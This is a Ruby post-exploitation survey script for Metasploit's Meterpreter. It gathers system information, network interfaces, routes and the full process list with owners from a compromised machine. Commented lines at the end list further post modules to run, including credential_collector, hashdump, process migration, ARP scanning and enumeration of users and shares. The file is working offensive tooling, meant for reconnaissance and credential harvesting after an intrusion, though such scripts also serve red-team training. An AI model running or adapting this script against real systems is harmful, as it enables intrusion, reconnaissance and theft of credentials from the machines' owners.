# survey.rb
# Modular post-exploitation survey kit
# 

# Grabs and prints information about the base computer
def getinfo( session ) 
  begin
    sysnfo = session.sys.config.sysinfo
    runpriv = session.sys.config.getuid
    print_status("Getting system information ...")
    print_status("\tThe target machine OS is #{sysnfo['OS']}")
    print_status("\tThe computer platform is: #{client.platform}")
    print_status("\tThe computer name is #{sysnfo['Computer']} ")
    print_status("\tScript running as #{runpriv}")
  rescue ::Exception => e
    print_error("The following error was encountered #{e}")
  end
end


# Grabs and prints network information about the target
def getnetinfo( session )
# Print interface information
  interfaces = client.net.config.interfaces
  num = 1
  print_status("Getting interface information ...")
  interfaces.each do |i|
    print_status("\tInterface #{num} has IP #{i.addrs[0]} [#{i.netmasks[0]}]")
    num += 1
  end
# Print route information
  routes = client.net.config.routes
  print_status("Getting system routes ...")
  routes.each do |r|
#    print_status("\tRoute #{r}")
    print_status("\tRoute #{r.subnet}/#{r.netmask} to #{r.gateway} interface #{r.interface} metric #{r.metric}")
  end
end

# Grabs and prints process information about the target
def getprocinfo( session )
  print_status("Getting process information ...")
  processes = session.sys.process.get_processes
  print_status("\tProcess Name\tPID\tPPID\tOwner\tArch")
  processes.each do |p|
#{"pid"=>0, "ppid"=>0, "name"=>"[System Process]", "path"=>"", "session"=>4294967295, "user"=>"", "arch"=>""}
    print_status("\t#{p['name']} PID #{p['pid']} PPID #{p['ppid']} Arch #{p['arch']}")
    print_status("\t\tPath: #{p['path']}")
    print_status("\t\tOwner: #{p['user']}")
    print_status("")
  end
end


## Script Initialization
time_stamp  = ::Time.now.strftime('%Y-%m-%d:%H:%M:%S')
print_status("Survey Initializing #{time_stamp.to_s}")

# Runs prepared functions
getinfo( session )
getnetinfo( session )
getprocinfo( session )



time_stamp  = ::Time.now.strftime('%Y-%m-%d:%H:%M:%S')
print_status("Survey Complete #{time_stamp.to_s}")

#if (session.type == "meterpreter")
#  uid = session.sys.config.getuid
  # If we're not system, bail on out
#  if (uid != "NT AUTHORITY\\SYSTEM")
#    print_error("Error, must have SYSTEM meterpreter shell")
#    return
#  end
# end

  # Figure out what our IP address is
  # ARP scan the subnet
  # run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24

  # Harvest the process list

  # Other survey capabilities:
# run_single("use post/windows/gather/checkvm")
# run post/windows/gather/checkvm 
# run post/windows/gather/credential_collector 

# run post/windows/manage/migrate
# run post/windows/gather/dumplinks (<- gets recent docs .lnk files, so we need to be in a user process)

# run post/windows/gather/enum_applications
# run post/windows/gather/enum_logged_on_users
# run post/windows/gather/enum_shares
# run post/windows/gather/enum_snmp
# run post/windows/gather/hashdump
# run post/windows/gather/usb_history




